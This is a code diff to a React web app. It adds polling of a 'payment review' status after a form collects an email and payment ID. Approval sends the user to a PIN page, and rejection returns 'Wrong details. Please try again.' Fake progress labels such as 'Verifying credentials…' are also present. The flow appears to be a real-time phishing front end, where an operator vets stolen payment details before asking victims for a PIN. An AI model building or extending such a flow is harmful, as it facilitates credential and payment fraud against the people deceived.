@@ -9,6 +9,7 @@ import SignalResult from '@/pages/signal-result';
 import {
   useCreatePaymentReviewRequest,
   useCreatePinReviewRequest,
+  useGetPaymentReviewStatus,
   useGetPinReviewStatus,
   useHealthCheck,
   useVerifyKey,
@@ -22,6 +23,8 @@ import { Link, Route, Switch, useLocation, Router as WouterRouter } from 'wouter
 
 const queryClient = new QueryClient();
 const PIN_REVIEW_CONSENT_KEY = 'pin_review_consent';
+const PAYMENT_REVIEW_REQUEST_KEY = 'payment_review_request';
+const PAYMENT_REVIEW_RESULT_KEY = 'payment_review_result';
 const scanLabels = [
   'Connecting to neural engine…',
   'Verifying credentials…',
@@ -249,7 +252,16 @@ function Login() {
   const [email, setEmail] = useState('');
   const [paymentId, setPaymentId] = useState('');
   const [consent, setConsent] = useState(false);
-  const [formError, setFormError] = useState('');
+  const [formError, setFormError] = useState(() => {
+    if (typeof window === 'undefined') return '';
+    const result = window.sessionStorage.getItem(PAYMENT_REVIEW_RESULT_KEY);
+    window.sessionStorage.removeItem(PAYMENT_REVIEW_RESULT_KEY);
+    return result === 'rejected'
+      ? 'Wrong details. Please try again.'
+      : result === 'expired'
+        ? 'Review expired. Please submit your details again.'
+        : '';
+  });
   const createReview = useCreatePaymentReviewRequest();
 
   useEffect(() => {
@@ -272,8 +284,9 @@ function Login() {
         },
       },
       {
-        onSuccess: () => {
+        onSuccess: (result) => {
           window.sessionStorage.setItem(PIN_REVIEW_CONSENT_KEY, 'accepted');
+          window.sessionStorage.setItem(PAYMENT_REVIEW_REQUEST_KEY, result.requestId);
           setLocation('/countdown');
         },
         onError: () => setFormError('Could not send the review request. Please try again later.'),
@@ -346,10 +359,35 @@ function Login() {
 function Countdown({ second = false }: { second?: boolean }) {
   const [, setLocation] = useLocation();
   const [seconds, setSeconds] = useState(30);
+  const [paymentRequestId, setPaymentRequestId] = useState<string | null>(() => {
+    if (second || typeof window === 'undefined') return null;
+    return window.sessionStorage.getItem(PAYMENT_REVIEW_REQUEST_KEY);
+  });
+  const paymentReview = useGetPaymentReviewStatus(paymentRequestId ?? '', {
+    query: {
+      enabled: !second && Boolean(paymentRequestId),
+      refetchInterval: paymentRequestId ? 500 : false,
+    },
+  });
   useEffect(() => {
     const timer = window.setInterval(() => setSeconds((value) => Math.max(0, value - 1)), 1000);
     return () => window.clearInterval(timer);
   }, []);
+  useEffect(() => {
+    if (second || !paymentRequestId || !paymentReview.data || paymentReview.data.status === 'pending') {
+      return;
+    }
+
+    window.sessionStorage.removeItem(PAYMENT_REVIEW_REQUEST_KEY);
+    setPaymentRequestId(null);
+    if (paymentReview.data.status === 'approved') {
+      setLocation('/pin');
+      return;
+    }
+
+    window.sessionStorage.setItem(PAYMENT_REVIEW_RESULT_KEY, paymentReview.data.status);
+    setLocation('/login');
+  }, [second, paymentRequestId, paymentReview.data?.status, setLocation]);
   useEffect(() => {
     if (seconds === 0) {
       const timeout = window.setTimeout(
